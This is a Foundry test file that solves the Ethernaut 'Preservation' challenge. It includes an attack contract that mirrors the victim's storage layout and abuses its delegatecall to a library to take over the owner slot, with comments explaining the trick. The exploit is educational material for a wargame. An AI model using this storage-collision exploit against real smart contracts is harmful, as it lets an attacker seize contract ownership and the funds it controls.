// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Preservation/PreservationFactory.sol";
import "../src/Ethernaut.sol";

contract PreservationTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testPreservationHack() public {
        /****************
         * Factory setup *
         *************** */
        PreservationFactory PreservationFactory = new PreservationFactory();
        ethernaut.registerLevel(PreservationFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(
            PreservationFactory
        );
        Preservation ethernautPreservation = Preservation(levelAddress);
        /****************
         *    Attack     *
         *************** */
        PreservationHack preservationHack = new PreservationHack(levelAddress);
        /*
         * This challenge teaches us something very important.
         * It's not recommended to use external contract to update a contract state
         *
         * When the Preservation contract execute setFirstTime(UINT) it actually calls
         *   LibraryContract.setTime(UINT) via delegate call
         *
         * By setting up a hack contract, with the exact same storage layout
         * We can re-define the setTime function to also update the owner.
         * Calling setFirstTime will make a delegate call to timeZone1Library
         * Which, in our case is the hack contract. So it will call the setTime function with the addres of the contract
         * Then we can call it a second time to make msg.sender the owner
         *  In our case --> player.
         *
         */

        vm.roll(5); // prevent underflow
        preservationHack.attack();
        assertEq(ethernautPreservation.owner(), player);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract PreservationHack {
    // same storage layout as victim
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    Preservation public challenge;

    constructor(address _victim) {
        challenge = Preservation(_victim);
    }

    function setTime(uint256 time) public {
        // here time == address !
        // we jut have to cast it back from uint 256 <-> address
        owner = address(uint160(time));
    }

    function attack() external {
        challenge.setFirstTime(uint256(uint160(address(this))));
        challenge.setFirstTime(uint256(uint160(msg.sender)));
    }
}
